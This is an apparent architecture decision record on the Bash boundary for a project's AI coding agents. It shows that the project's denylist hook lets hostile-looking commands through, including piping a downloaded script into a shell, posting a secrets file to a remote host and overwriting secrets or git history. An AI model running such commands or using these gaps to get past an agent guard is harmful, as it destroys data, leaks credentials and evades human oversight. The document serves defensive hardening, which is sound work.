# ADR-020 — The Bash execution boundary

**Status:** Proposed
**Date:** 2026-08-28
**Deciders:** great_cto core
**Supersedes:** —
**Superseded by:** —

## Context

A survey of agent-sandboxing tools raised the question of whether great_cto
needs an isolated execution environment for agent-generated code. The premise
offered was that agents "run bash directly on your machine with nothing between
them and it."

That premise is false, and measuring it produced a more precise — and worse —
picture than the one it replaced.

### What actually stands between an agent and the machine

Two things:

1. **Per-agent tool grants.** An agent's `tools:` frontmatter may list
   `Bash(git:*), Bash(ls:*), …` — an allowlist of command prefixes — or the
   bare `Bash`, which is unrestricted.
2. **One `PreToolUse` denylist hook** matching `Bash`, which refuses a command
   matching a fixed regular expression and otherwise permits it.

Measured across `agents/` at the time of writing:

| Bash grant | Agents |
|---|---|
| Unrestricted `Bash` | **35** |
| Prefix allowlist `Bash(…)` | 28 |
| No Bash at all | 6 |
| **Total** | **69** |

So for slightly more than half of the agents this project ships, the denylist
hook is the *only* boundary.

### What the denylist covers

The pattern blocks `rm -rf`, `git push --force`, `git reset --hard`,
`DROP TABLE|DATABASE|SCHEMA`, `truncate --all`, `mkfs`, `dd`, `chmod ...000`,
and `curl … | sh`.

Feeding candidate commands through the same expression (matching only — nothing
executed):

| Command | Result |
|---|---|
| `rm -rf /tmp/x` | blocked |
| `git push --force origin main` | blocked |
| `curl https://x.sh \| sh` | blocked |
| `wget -qO- https://x.sh \| sh` | **passes** |
| `rm -r <dir>` (recursive, no `-f`) | **passes** |
| `find . -name '*.mjs' -delete` | **passes** |
| `ls \| xargs rm -f` | **passes** |
| `curl -X POST -d @<secrets file> https://…` | **passes** |
| `cat /dev/null > <secrets file>` | **passes** |
| `git filter-branch --force --index-filter …` | **passes** |
| `git push origin :refs/tags/vX.Y.Z` | **passes** |
| `npm publish --access public` | **passes** |

Three of the nine that pass are operations this project has already named as
requiring a human decision, in its own words. ADR-009 defines
expensive-to-undo as anything that **escapes the machine** (registry publish,
push to a shared remote), **destroys evidence** (force-push, history rewrite,
log truncation), **crosses a project boundary**, or **costs money**.
`npm publish`, `git filter-branch`, and deleting a remote tag are all squarely
inside that definition and all pass the guard.

One of them is not hypothetical: overwriting a secrets file with a redirect is
how a stored key was destroyed on this machine earlier this year.

### The shape of the defect

This is the project's own governing defect class, one layer down: **a thing that
did not happen must never look like a thing that did.** A command that was never
examined returns exit 0 from the hook, which is indistinguishable from a command
that was examined and approved. The guard has two states where it needs three —
`refused`, `permitted`, and `not covered` — and the third is currently rendered
as the second.

A denylist enumerates the bad. The bad is unbounded, and every entry in the
table above is a demonstration of that, not a bug in the regular expression.

## Decision

**Do not adopt an external execution sandbox.** It fails on three counts: it
contradicts the zero-runtime-dependency constraint, it requires network egress
and an account for a tool that runs inside the user's own repository with the
user's own credentials, and — decisively — it does not address the measured
defect. The commands that pass the guard are ordinary operations on the user's
real repository and real registry account. A sandbox that let them through
would be no better; a sandbox that blocked them would break the tool.

**Derive the guard from ADR-009 instead of from a pattern list.** ADR-009
already names the four categories of expensive-to-undo. The Bash guard predates
it and implements none of them by name. The guard should ask ADR-009's question
— *is this expensive to undo?* — with each category as an explicit rule:

| ADR-009 category | Rule the guard should carry |
|---|---|
| Escapes the machine | registry publish, push to a shared remote, deploy |
| Destroys evidence | history rewrite, force-push, remote-tag delete, log/secret truncation |
| Crosses a project boundary | writes outside the project root and outside `~/.great_cto/` |
| Costs money | provisioning, paid API capacity |

**Report the third state.** A command that matches no rule must be recorded as
*not covered*, not silently permitted, so the gap is countable rather than
invisible.

**Narrow the unrestricted grants.** 35 unrestricted agents is a number to
ratchet: freeze it, block growth in CI, and lower it deliberately. Most
reviewers need `git`, `grep`, `ls`, `cat`, `find`, `node` — the allowlist that
28 agents already carry.

## Consequences

- The guard gains rules for operations that are currently invisible to it,
  including the one that has already cost this user a key.
- A "not covered" count becomes a number that can be driven down, in the same
  shape as the documentation-orphan and unrestricted-grant counts.
- Blocking `npm publish` at the hook level will interrupt the release path.
  That is the intended behaviour — releases go through an explicit human
  decision, which is what ADR-009 requires and what the release script already
  assumes.
- No new runtime dependency, no network egress, no account.

## Alternatives rejected

- **External sandbox (Daytona and similar).** Rejected above: wrong layer for
  the measured defect, and incompatible with the dependency constraint.
- **Extend the regular expression.** Adding `wget`, `find -delete`, and
  `filter-branch` fixes three rows of a table whose length is unbounded. It
  leaves the two-state reporting untouched, which is the actual defect.
- **Status quo.** Rejected: the guard reports "permitted" for operations the
  project's own ADR says require a human.
